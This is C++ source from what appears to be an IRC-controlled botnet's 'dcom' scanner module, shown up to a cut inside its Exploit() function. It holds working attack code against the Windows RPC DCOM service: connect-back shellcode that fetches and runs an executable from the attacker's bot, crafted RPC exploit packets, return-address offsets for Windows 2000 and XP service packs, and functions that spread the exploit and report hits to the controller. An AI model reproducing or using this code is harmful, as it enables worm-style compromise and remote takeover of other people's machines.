
#include "main.h"
#include "dcomscanner.h"
#include "mainctrl.h"
#include "utility.h"
#include "shellcode.h"

/*
	Don't msg me telling me the scanner doesn't work. Im tired of that,
	it does work, you just have to figure out how.
*/

#define DCOM_SHELLCODE_OFFSET_IP	0x16D	// Offset for the IP to connect to
#define DCOM_SHELLCODE_OFFSET_PORT	0x171	// Offset for the port to connect to

char dcom_shellcode[]=
	"\xE9\x5F\x01\x00\x00\x5B\x56\x57\x50\xE8\xB3\x03\x00\x00\x8D"
	"\xB3\x9F\x00\x00\x00\x8D\xBB\xA8\x00\x00\x00\xC7\x83\xA7\x01\x00"
	"\x00\x0F\x00\x00\x00\xE8\x07\x03\x00\x00\x89\x83\xF4\x00\x00\x00"
	"\x8D\xBB\xB7\x00\x00\x00\xC7\x83\xA7\x01\x00\x00\x0D\x00\x00\x00"
	"\xE8\xEC\x02\x00\x00\x89\x83\xF0\x00\x00\x00\x8D\xBB\xC4\x00\x00"
	"\x00\xE8\xC3\x02\x00\x00\x89\x83\xE4\x00\x00\x00\x8D\xBB\xCA\x00"
	"\x00\x00\xE8\xB2\x02\x00\x00\x89\x83\xE8\x00\x00\x00\x8D\xBB\xD5"
	"\x00\x00\x00\xE8\xA1\x02\x00\x00\x89\x83\xEC\x00\x00\x00\x8D\xB3"
	"\x0A\x00\x00\x00\x8D\xBB\x11\x00\x00\x00\xE8\x8A\x02\x00\x00\x89"
	"\x83\x41\x00\x00\x00\x8D\xBB\x1C\x00\x00\x00\xE8\x79\x02\x00\x00"
	"\x89\x83\x45\x00\x00\x00\x8D\xBB\x23\x00\x00\x00\xE8\x68\x02\x00"
	"\x00\x89\x83\x49\x00\x00\x00\x8D\xBB\x2B\x00\x00\x00\xE8\x57\x02"
	"\x00\x00\x89\x83\x4D\x00\x00\x00\x8D\xBB\x30\x00\x00\x00\xE8\x46"
	"\x02\x00\x00\x89\x83\x51\x00\x00\x00\x8D\xBB\x35\x00\x00\x00\xE8"
	"\x35\x02\x00\x00\x89\x83\x55\x00\x00\x00\x8D\xB3\x59\x00\x00\x00"
	"\x8D\xBB\x60\x00\x00\x00\xE8\x1E\x02\x00\x00\x89\x83\x87\x00\x00"
	"\x00\x8D\xBB\x66\x00\x00\x00\xE8\x0D\x02\x00\x00\x89\x83\x8B\x00"
	"\x00\x00\x8D\xBB\x6D\x00\x00\x00\xE8\xFC\x01\x00\x00\x89\x83\x8F"
	"\x00\x00\x00\x8D\xBB\x74\x00\x00\x00\xE8\xEB\x01\x00\x00\x89\x83"
	"\x93\x00\x00\x00\x8D\xBB\x7B\x00\x00\x00\xE8\xDA\x01\x00\x00\x89"
	"\x83\x97\x00\x00\x00\x8D\xBB\x82\x00\x00\x00\xE8\xC9\x01\x00\x00"
	"\x89\x83\x9B\x00\x00\x00\x53\xE8\xEB\x02\x00\x00\x5B\x58\x5F\x5E"
	"\xE8\x10\x05\x00\x00\xE8\x9C\xFE\xFF\xFF\x00\x00\x00\x00\x11\x11"
	"\x11\x11\x22\x22\x77\x73\x32\x5F\x33\x32\x00\x57\x53\x41\x53\x74"
	"\x61\x72\x74\x75\x70\x00\x73\x6F\x63\x6B\x65\x74\x00\x63\x6F\x6E"
	"\x6E\x65\x63\x74\x00\x72\x65\x63\x76\x00\x73\x65\x6E\x64\x00\x63"
	"\x6C\x6F\x73\x65\x73\x6F\x63\x6B\x65\x74\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x6D\x73\x76\x63\x72\x74\x00\x66\x6F\x70\x65\x6E\x00"
	"\x66\x63\x6C\x6F\x73\x65\x00\x66\x77\x72\x69\x74\x65\x00\x6D\x65"
	"\x6D\x73\x65\x74\x00\x6D\x61\x6C\x6C\x6F\x63\x00\x66\x72\x65\x65"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6B\x65\x72\x6E\x65\x6C\x33"
	"\x32\x00\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73"
	"\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x53\x6C"
	"\x65\x65\x70\x00\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\x00\x43"
	"\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65\x73\x73\x41\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x77\x2B"
	"\x62\x00\x00\x00\x00\x00\x77\x69\x6E\x68\x6C\x70\x70\x33\x32\x2E"
	"\x65\x78\x65\x00\x6F\x70\x65\x6E\x00\x16\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x51\x57\x56\x56\xFF\x93\xF0"
	"\x00\x00\x00\x50\x59\x57\x51\xFF\x93\xF4\x00\x00\x00\x5E\x5F\x59"
	"\xC3\x31\xC0\x89\x83\xA3\x01\x00\x00\x8B\x93\xA3\x01\x00\x00\x3B"
	"\x93\x93\x01\x00\x00\x7D\x63\x42\x89\x93\xA3\x01\x00\x00\x31\xC0"
	"\x8B\x83\xA3\x01\x00\x00\xC1\xE0\x02\x8B\x8B\x9B\x01\x00\x00\x01"
	"\xC1\x8B\x01\x03\x83\x8F\x01\x00\x00\x57\x56\x51\x89\xFE\x89\xC7"
	"\x8B\x8B\xA7\x01\x00\x00\xF3\xA6\x59\x5E\x5F\x75\xBC\x31\xC0\x8B"
	"\x83\xA3\x01\x00\x00\xD1\xE0\x8B\x8B\x9F\x01\x00\x00\x01\xC1\x31"
	"\xC0\x66\x8B\x01\xC1\xE0\x02\x8B\x8B\x97\x01\x00\x00\x01\xC8\x8B"
	"\x08\x03\x8B\x8F\x01\x00\x00\x89\xC8\xC3\x31\xC0\xC3\xE9\xC8\x02"
	"\x00\x00\x3E\x8B\x40\x34\x3E\x8B\xA8\xB8\x00\x00\x00\xE9\x0E\x00"
	"\x00\x00\x50\x51\x56\x55\x64\xA1\x30\x00\x00\x00\x85\xC0\x78\xE2"
	"\x3E\x8B\x40\x0C\x3E\x8B\x70\x1C\xAD\x3E\x8B\x68\x08\x89\xAB\x8F"
	"\x01\x00\x00\x89\xE8\x66\x81\x38\x4D\x5A\x75\xC1\x05\x3C\x00\x00"
	"\x00\x8B\x08\x03\x8B\x8F\x01\x00\x00\x66\x81\x39\x50\x45\x75\xAD"
	"\x81\xC1\x78\x00\x00\x00\x8B\x31\x03\xB3\x8F\x01\x00\x00\x81\xC6"
	"\x18\x00\x00\x00\xAD\x89\x83\x93\x01\x00\x00\xAD\x03\x83\x8F\x01"
	"\x00\x00\x89\x83\x97\x01\x00\x00\xAD\x03\x83\x8F\x01\x00\x00\x89"
	"\x83\x9B\x01\x00\x00\xAD\x03\x83\x8F\x01\x00\x00\x89\x83\x9F\x01"
	"\x00\x00\x5D\x5E\x59\x58\xC3\x50\xB8\x00\x04\x00\x00\xE8\x71\x01"
	"\x00\x00\x3D\x00\x00\x00\x00\x0F\x84\xEA\xFF\xFF\xFF\x89\x83\x83"
	"\x01\x00\x00\x58\x8B\x93\x83\x01\x00\x00\x52\x68\x01\x01\x00\x00"
	"\x3E\xFF\x53\x41\x3D\x00\x00\x00\x00\x0F\x85\xE5\xFF\xFF\xFF\x68"
	"\x06\x00\x00\x00\x68\x01\x00\x00\x00\x68\x02\x00\x00\x00\x3E\xFF"
	"\x53\x45\x3D\xFF\xFF\xFF\xFF\x0F\x84\xE2\xFF\xFF\xFF\x89\x83\xF8"
	"\x00\x00\x00\x57\x50\x53\x8D\x93\x7F\x01\x00\x00\xC6\x02\x16\x52"
	"\x8D\x93\xFC\x00\x00\x00\x66\xC7\x02\x02\x00\x66\x8B\x7B\x08\x66"
	"\x89\x7A\x02\x8B\x7B\x04\x89\x7A\x04\x52\x8B\x83\xF8\x00\x00\x00"
	"\x50\x3E\xFF\x53\x49\x3D\x00\x00\x00\x00\x0F\x8C\xC6\xFF\xFF\xFF"
	"\x5B\x58\x5F\x50\xB8\x00\x10\x00\x00\xE8\xD5\x00\x00\x00\x3D\x00"
	"\x00\x00\x00\x0F\x84\xEA\xFF\xFF\xFF\x89\x83\x60\x01\x00\x00\x58"
	"\xE8\x39\x00\x00\x00\xE8\xD8\x00\x00\x00\xE8\x57\x00\x00\x00\xE8"
	"\x1F\x01\x00\x00\xC3\x8B\x83\xF8\x00\x00\x00\x50\x3E\xFF\x53\x55"
	"\x8B\x83\xAB\x01\x00\x00\x40\x89\x83\xAB\x01\x00\x00\x3D\x05\x00"
	"\x00\x00\x0F\x84\x05\x00\x00\x00\xE9\x42\xFF\xFF\xFF\xC3\x68\x00"
	"\x00\x00\x00\x68\x04\x00\x00\x00\x8D\x93\x87\x01\x00\x00\x52\x8B"
	"\x93\xF8\x00\x00\x00\x52\x3E\xFF\x53\x4D\x3D\x01\x00\x00\x00\x0F"
	"\x8C\xB0\xFF\xFF\xFF\xC3\x57\x56\x8B\xBB\x87\x01\x00\x00\x8B\xB3"
	"\x8B\x01\x00\x00\x39\xF7\x5E\x5F\x0F\x84\x32\x00\x00\x00\x68\x00"
	"\x00\x00\x00\x68\x00\x10\x00\x00\x8B\x93\x60\x01\x00\x00\x52\x8B"
	"\x93\xF8\x00\x00\x00\x52\x3E\xFF\x53\x4D\x3D\x01\x00\x00\x00\x0F"
	"\x8C\x70\xFF\xFF\xFF\x01\x83\x8B\x01\x00\x00\xE9\x50\x00\x00\x00"
	"\xE8\x6E\x00\x00\x00\x50\x8B\x83\xF8\x00\x00\x00\x50\x3E\xFF\x53"
	"\x55\x58\xC3\x89\xC7\x50\x3E\xFF\x93\x97\x00\x00\x00\x5F\x50\x57"
	"\x68\x00\x00\x00\x00\x50\x3E\xFF\x93\x93\x00\x00\x00\x5F\x5F\x5F"
	"\x58\xC3\x8D\x93\x64\x01\x00\x00\x52\x8D\x93\x6C\x01\x00\x00\x52"
	"\x3E\xFF\x93\x87\x00\x00\x00\x5F\x5F\x89\x83\x68\x01\x00\x00\xC3"
	"\xFF\xB3\x68\x01\x00\x00\x50\x68\x01\x00\x00\x00\x8B\x93\x60\x01"
	"\x00\x00\x52\x3E\xFF\x93\x8F\x00\x00\x00\x5F\x5F\x5F\x5F\xE9\x43"
	"\xFF\xFF\xFF\x8B\x93\x68\x01\x00\x00\x52\x3E\xFF\x93\x8B\x00\x00"
	"\x00\x5F\xC3\x50\x8D\x83\x0C\x01\x00\x00\x50\x8D\x83\x1C\x01\x00"
	"\x00\x50\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x68\x28\x00\x00"
	"\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00"
	"\x8D\x83\x6C\x01\x00\x00\x50\x68\x00\x00\x00\x00\x3E\xFF\x93\xEC"
	"\x00\x00\x00\x58\xC3\xE8\xA9\xFF\xFF\xFF\x68\x00\x00\x00\x00\xFF"
	"\x93\xE8\x00\x00\x00\x90";


char bindstr[]=
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00"
	"\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

char request1[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03\x00\x00\xE5\x00\x00\x00"
	"\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45\x64\x49\xB0\x70\xDD\xAE"
	"\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	"\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E\x0D\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D\xCE\x11\xA6\x6A\x00\x20"
	"\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41\x52\x42\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\xA8\xF4\x0B\x00"
	"\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00"
	"\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00\x00\x00\x4D\x45\x4F\x57"
	"\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
	"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29\xCD\x00\x00\x00\x00\x00"
	"\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
	"\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x78\x00\x00\x00"
	"\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0C\x00"
	"\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xD8\x98\x93"
	"\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00\x00\x00\x32\x00\x31\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00\x00\x00\x0D\xF0\xAD\xBA"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
	"\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
	"\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E\xE9\x4A\x99\x99\xF1\x8A"
	"\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00\x00\x00\x78\x00\x6E\x00"
	"\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
	"\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00\x00\x00\x30\x00\x2E\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00\x00\x00\x0E\x00\xFF\xFF"
	"\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char request2[]=
	"\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

/*	\E$\938479272375092753287.xls
	\F$\993847593892837527687.bat
	\S$\267364889234572836487.cmd
	\Y$\128736872350982734872.zip
	\V$\287348927347869928738.rar
	\W$\348579872387469762349.tmp
	\X$\349587230872349876934.bla
	\U$\349879876098209889734.h4x */

char request3[]= // \C$\123456111111111111111.doc
	"\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00"
	"\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00";

char request4[]=
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00"
	"\x00\x00\x00\x00\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00"
	"\x28\x8C\x0C\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";

char shellcode_start[]=
	"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x46\x00\x58\x00"
	"\xff\xff\xff\xff"	/* return address */
	"\xcc\xe0\xfd\x7f"	/* primary thread data block */
	"\xcc\xe0\xfd\x7f";	/* primary thread data block */

char nops[]=
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90";

unsigned long offsets[]=
{	0x77e81674,		// Win2K SP0
	0x77e829ec,		// Win2K SP1
	0x77e824b5,		// Win2K SP2
	0x77e8367a,		// Win2K SP3
	0x77f92a9b,		// Win2K SP4
	0x77e9afe3,		// WinXP SP0
	0x77e626ba};	// WinXP SP1

unsigned long magic_offsets[]=
{	0x0018759F,		// Win2K
	0x001875E3,		// Win2K
	0x001F0CD0,		// Win2K
	0x010016C6,		// WinXP
	0x010016CB};	// WinXP

unsigned long oc192_offsets[]=
{	0x0018759F,		// Win2K
	0x0100139d};	// WinXP

unsigned long my_offsets[]=
{	0x010016C6,		// Win2K
	0x0100139d};	// WinXP

/*
	// Address		-	OS		-	Version			-	Language	-	Servie Pack
	0x01001C55		//	Win2k3	-	Standard		-	English		-	SP0
	0x010016C6		//	Win2k	-	all				-	all			-	all
	0x0100139d		//	WinXP	-	Professional	-	German		-	all
*/


/*
		DCOM Scanner starts here
		scans for dcom exploit
*/

CScannerDCOM::CScannerDCOM() { m_sScannerName.Assign("dcom"); }
void CScannerDCOM::StartScan(const CString &sHost)
{	bool bSuccess=false;
	if(ScanPort(sHost.CStr(), 135))
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s:135.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=Exploit(sHost); }

#ifdef WIN32
	if(ScanPort(sHost.CStr(), 445) && !bSuccess)
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s:445.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=ExploitNP(sHost); }
#endif

	// Success
	if(bSuccess) g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: exploited ip %s.", m_sScannerName.CStr(), sHost.CStr()); }

bool CScannerDCOM::ExploitNP(const CString &sHost)
{
#ifdef WIN32
	int iHostOS=FpHost(sHost.CStr(), FP_PORT5K);
	NETRESOURCEW nr; bool bRetVal=false;
	if(!ConnectViaNullSession(sHost.CStr(), &nr)) return bRetVal;
	else
	{	char szPipePath[MAX_PATH];
		sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", sHost.CStr());
    
		HANDLE hFile=CreateFile(szPipePath, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, \
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  
		if(hFile!=INVALID_HANDLE_VALUE)
		{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: connected to pipe \\\\%s\\pipe\\epmapper.", m_sScannerName.CStr(), sHost.CStr());
			char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
			int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=sizeof(nops)-1;
			char *pTemp;

			if(IsPrivate(g_cMainCtrl.m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(sHost.CStr()))
				iShellSize=setup_shellcode(dcom_shellcode, sizeof(dcom_shellcode), szShellBuf, sizeof(szShellBuf), \
					g_cMainCtrl.m_cBot.bot_ftrans_port.iValue, inet_addr(g_cMainCtrl.m_cIRC.m_sLocalHost.CStr()), \
					DCOM_SHELLCODE_OFFSET_PORT, DCOM_SHELLCODE_OFFSET_IP, NULL);
			else
				iShellSize=setup_shellcode(dcom_shellcode, sizeof(dcom_shellcode), szShellBuf, sizeof(szShellBuf), \
					g_cMainCtrl.m_cBot.bot_ftrans_port.iValue, g_cMainCtrl.m_cIRC.m_lLocalAddr, \
					DCOM_SHELLCODE_OFFSET_PORT, DCOM_SHELLCODE_OFFSET_IP, NULL);
			
			// Build a buffer with the shellcode
			memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
			memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
			memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
			iSCSize=iPos; iPos=0;

			// Prepend NOPs as long as shellcode doesn't fit RPC packet format
			while(iSCSize%16!=12)
			{	char *szTemp=(char*)malloc(iSCSize+1); iNOPSize++;
				memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
				memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
				memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
				iSCSize=iPos; iPos=0; free(szTemp); }

			// Set the return address
			if(iHostOS==OS_WINXP)
				memcpy(szSCBuf+36, (char*)&my_offsets[1], 4);
			else
				memcpy(szSCBuf+36, (char*)&my_offsets[0], 4);

			// Build the request
			memcpy(szReqBuf+iPos,	request1,			sizeof(request1)-1			); iPos+=sizeof(request1)-1;
			memcpy(szReqBuf+iPos,	request2,			sizeof(request2)-1			); iPos+=sizeof(request2)-1;
			memcpy(szReqBuf+iPos,	szSCBuf,			iSCSize						); iPos+=iSCSize;
			memcpy(szReqBuf+iPos,	request3,			sizeof(request3)-1			); iPos+=sizeof(request3)-1;
			memcpy(szReqBuf+iPos,	request4,			sizeof(request4)-1			); iPos+=sizeof(request4)-1;
			iReqSize=iPos;

			pTemp=szReqBuf+sizeof(request1)-1; // Fill the request with the right sizes
			*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iSCSize / 2;
			*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize / 2; pTemp=szReqBuf;
			*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iSCSize - 12;

			unsigned long lWritten; char *szInBuf=(char*)malloc(100000); memset(szInBuf, 0, 100000);
			// Send the bind string
			DWORD dwRead; TransactNamedPipe(hFile, bindstr, sizeof(bindstr)-1, szInBuf, 10000, &dwRead, NULL);
			if(szInBuf[2]!=0x0C) { CloseHandle(hFile); CloseNullSession(sHost.CStr()); return bRetVal; }
			// Send the evil request
			if(!WriteFile(hFile, szReqBuf, iReqSize, &lWritten, 0)) { CloseHandle(hFile); CloseNullSession(sHost.CStr()); return bRetVal; }
			if(!ReadFile(hFile, szInBuf, 10000, &dwRead, NULL)) bRetVal=true; else bRetVal=false;
			free(szInBuf); }

		CloseHandle(hFile);
		CloseNullSession(sHost.CStr()); }
	return bRetVal;
#endif
	return false; }

bool CScannerDCOM::Exploit(const CString &sHost)
{	char szRecvBuf[4096]; char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
	int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=sizeof(nops)-1;
	char *pTemp; int iHostOS=FpHost(sHost.CStr(), FP_RPC);
	if(iHostOS==OS_UNKNOWN || iHostOS==OS_WINNT) return false;

	// Get a funky fresh socket
	int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sSocket==SOCKET_ERROR) return false;

	// Fill in sockaddr and resolve the host
	sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET; ssin.sin_port=htons(135);
	ssin.sin_addr.s_addr=ResolveAddress(sHost.CStr());
	if(ssin.sin_addr.s_addr==INADDR_NONE) // The host couldn't be resolved, exit
	{	xClose(sSocket); return false; }

	if(IsPrivate(g_cMainCtrl.m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(sHost.CStr()))
		iShellSize=setup_shellcode(dcom_shellcode, sizeof(dcom_shellcode), szShellBuf, sizeof(szShellBuf), \
			g_cMainCtrl.m_cBot.bot_ftrans_port.iValue, inet_addr(g_cMainCtrl.m_cIRC.m_sLocalHost.CStr()), \
			DCOM_SHELLCODE_OFFSET_PORT, DCOM_SHELLCODE_OFFSET_IP, NULL);
	else
		iShellSize=setup_shellcode(dcom_shellcode, sizeof(dcom_shellcode), szShellBuf, sizeof(szShellBuf), \
